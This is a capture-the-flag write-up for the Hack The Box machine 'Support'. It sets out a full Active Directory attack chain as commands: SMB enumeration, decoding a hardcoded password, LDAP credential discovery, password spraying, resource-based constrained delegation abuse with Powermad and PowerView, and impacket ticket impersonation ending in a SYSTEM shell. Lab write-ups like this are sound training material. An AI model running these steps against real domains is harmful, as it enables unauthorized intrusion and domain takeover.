# HTB - Support

**IP Address:** `10.10.11.174`  
**OS:** Windows  
**Difficulty:** Easy  
**Tags:** #SMB, #LDAP, #WinRM, #Kerberos, #BloodHound, #RBCD

---

## 1. Network Scanning

### 1.1 Ping Test

Verified machine is alive.

### 1.2 Nmap Full Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.174 -oG allPorts
```
![[Pasted image 20250308152618.png]]

Found several ports including SMB (445), LDAP (389), WinRM (5985), and Kerberos (88).

### 1.3 Targeted Nmap Scan

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49679,49701,49739 -sC -sV 10.10.11.174 -oN targeted
```

Found Active Directory-related services running. Domain name: `support.htb`.

---

## 2. SMB Enumeration

### 2.1 Check Shares

```bash
smbclient -L 10.10.11.174 -N
```

Found share: `support-tools`

```bash
smbmap -H 10.10.11.174 -u none
```

Only `IPC$` and `support-tools` are accessible anonymously.

### 2.2 Explore support-tools Share

```bash
smbclient //10.10.11.174/support-tools -N
```

Downloaded and extracted:

```bash
get UserInfo.exe.zip
unzip UserInfo.exe.zip
```

Examined contents:

```bash
cat UserInfo.exe.config
strings -e l UserInfo.exe
```

Found: `LDAP://support.htb`, user `armando`, and an encoded string — likely a password.

---

## 3. User Enumeration with Kerbrute

### 3.1 Validate User Existence

Created `users.txt` with "ldap" and ran:

```bash
/opt/kerbrute/kerbrute userenum -d support.htb --dc 10.10.11.174 users
```

✅ `ldap` user is valid!

### 3.2 Bruteforce Other Users  
(⚠️ No further valid usernames were found)

```bash
/opt/kerbrute/kerbrute userenum -d support.htb --dc 10.10.11.174 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

❌ (Dead end – Continue with ldap user)

---

## 4. Reverse Engineering Credentials

Using ILSpy on `UserInfo.exe` revealed:

- Encoded password for user `ldap`
- Base64 + XOR with `key2 = 223` and key `armando`

Decoded using:

```python
import base64
from itertools import cycle

enc_password = base64.b64decode("...")
key = b"armando"
key2 = 223

res = ''
for e,k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ key2)

print(res)
```

Recovered password for `ldap`: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

---

## 5. Validate Credentials

```bash
crackmapexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

✅ SMB login successful

```bash
crackmapexec winrm 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

❌ No WinRM access for `ldap` (🔒 Dead end)

---

## 6. RPC and LDAP Enumeration

Accessed RPC as `ldap`:

```bash
rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.10.11.174
```

- Enumerated users
- Saved usernames using regex:

```bash
rpcclient -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users
```

Attempted spraying the password across all users:

```bash
crackmapexec smb 10.10.11.174 -u users -p credentials.txt --continue-on-success
```

❌ Only `ldap` worked (🔒 Dead end)

---

## 7. Deep LDAP Search

```bash
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

Searched for user entries using:

```bash
grep -i "samaccountname: support" -B 40
```

🟢 Found plaintext password under `info` attribute:  
**`Ironside47pleasure40Watchful`**

---

## 8. Access via WinRM as support

```bash
evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
```

✅ Access granted  
🏁 **User flag obtained**

---

## 9. BloodHound for Privilege Escalation

Started Neo4j:

```bash
sudo neo4j console
```

Opened BloodHound web interface → http://localhost:7474  
Logged in with default credentials.

Uploaded data collected with:

```bash
.\SharpHound.exe -c All
```

✅ Path to domain admin via RBCD discovered

---

## 10. Exploiting RBCD

### 10.1 Powermad – Create Fake Machine

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force)
```

### 10.2 PowerView – Assign Delegation Rights

```powershell
$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer dc.support.htb | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

✅ Confirmed via:

```powershell
Get-DomainComputer dc.support.htb -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

---

## 11. Get Administrator Access

### 11.1 Sync Time

```bash
timedatectl set-ntp off
sudo rdate -n 10.10.11.174
```

### 11.2 Request TGS

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/SERVICEA$:123456
```

### 11.3 Pass the Ticket

```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc.support.htb
```

✅ SYSTEM shell obtained  
🏁 **Root flag captured**

---

# ✅ MACHINE COMPLETE
